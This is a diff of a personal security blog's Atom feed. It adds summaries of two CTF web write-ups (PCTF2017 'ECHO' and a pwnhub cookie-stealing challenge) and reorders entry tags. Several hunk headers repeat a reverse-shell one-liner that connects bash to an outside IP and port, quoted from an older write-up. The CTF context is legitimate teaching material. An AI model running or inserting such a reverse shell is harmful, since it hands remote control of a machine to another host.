@@ -5,7 +5,7 @@
   <link href="/feed.xml" rel="self"/>
   
   <link href="https://www.virzz.com/"/>
-  <updated>2017-04-16T13:27:42.000Z</updated>
+  <updated>2017-04-24T09:21:41.000Z</updated>
   <id>https://www.virzz.com/</id>
   
   <author>
@@ -14,6 +14,54 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PCTF2017-web-ECHO</title>
+    <link href="https://www.virzz.com/2017/04/22/PCTF2017-web-ECHO.html"/>
+    <id>https://www.virzz.com/2017/04/22/PCTF2017-web-ECHO.html</id>
+    <published>2017-04-22T11:24:18.000Z</published>
+    <updated>2017-04-24T09:21:41.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h2&gt;Challenge ECHO&lt;/h2&gt;
+&lt;p&gt;Web (200 pts)&lt;br&gt;
+If you hear enough, you may hear the whispers of a key...&lt;br&gt;
+If you see app.py well enough, yo
+    
+    </summary>
+    
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>胖哈勃破處﹣绝对防御</title>
+    <link href="https://www.virzz.com/2017/04/22/%E8%83%96%E5%93%88%E5%8B%83%E7%A0%B4%E8%99%95%EF%B9%A3%E7%BB%9D%E5%AF%B9%E9%98%B2%E5%BE%A1.html"/>
+    <id>https://www.virzz.com/2017/04/22/胖哈勃破處﹣绝对防御.html</id>
+    <published>2017-04-21T16:55:51.000Z</published>
+    <updated>2017-04-21T17:55:55.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h2&gt;题目介绍&lt;/h2&gt;
+&lt;p&gt;admin 刚刚完成了聊天版，会经常和大家聊天。&lt;/p&gt;
+&lt;p&gt;http://52.80.63.91/&lt;/p&gt;
+&lt;h2&gt;Get Cookie&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;Content-Security-Policy:
+default-src
+    
+    </summary>
+    
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="pwnhub" scheme="https://www.virzz.com/tags/pwnhub/"/>
+    
+  </entry>
   
   <entry>
     <title>某CTF 2017</title>
@@ -82,9 +130,9 @@ if (isset($_COOKIE[&amp;quot
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -578,9 +626,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -601,9 +649,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -625,9 +673,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -648,9 +696,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -672,9 +720,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -696,9 +744,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -738,9 +786,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
@@ -762,9 +810,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
